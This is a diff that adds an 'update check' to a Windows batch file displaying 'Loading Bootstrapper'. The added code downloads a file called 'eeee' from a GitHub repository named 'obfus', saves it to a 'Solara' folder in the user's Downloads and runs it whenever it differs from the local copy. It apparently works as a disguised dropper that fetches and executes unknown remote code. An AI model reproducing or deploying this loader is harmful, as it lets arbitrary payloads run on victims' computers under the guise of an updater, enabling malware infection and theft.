@@ -1,4 +1,49 @@
 @echo off
+setlocal enabledelayedexpansion
+
+:: Define the URL of the raw script on GitHub
+set "github_raw_url=https://raw.githubusercontent.com/Idkimcool9292/obfus/main/eeee"
+:: Define a temporary file path to store the downloaded script
+set "temp_script=%temp%\github_script.bat"
+:: Define the path of the current script
+set "local_script=%~dpnx0"
+:: Define the path to save the new script for the current user
+set "user_path=%userprofile%\Downloads\Solara"
+
+:: Download the script from GitHub
+echo Checking for updates...
+powershell -Command "Invoke-WebRequest -Uri !github_raw_url! -OutFile !temp_script! -UseBasicParsing"
+
+:: Check if the download was successful
+if not exist "!temp_script!" (
+    echo Failed to download the script from GitHub.
+    exit /b 1
+)
+
+:: Compare the downloaded script with the local script
+fc /b "!temp_script!" "!local_script!" > nul
+if %errorlevel% equ 0 (
+    echo No updates found.
+    del "!temp_script!"
+) else (
+    echo Updating...
+    :: Create the user path directory if it doesn't exist
+    if not exist "!user_path!" mkdir "!user_path!"
+
+    :: Update the script in the user path with the downloaded script
+    copy /Y "!temp_script!" "!user_path!\main_script.bat"
+    echo Update complete. Restarting the script...
+    start "" "!user_path!\main_script.bat"
+    del "!temp_script!"
+    exit /b
+)
+
+:: Your script continues below...
+echo Running the script...
+pause
+
+:: Main part of the script
+@echo off
 echo Loading Bootstrapper.
 :loop
 echo .
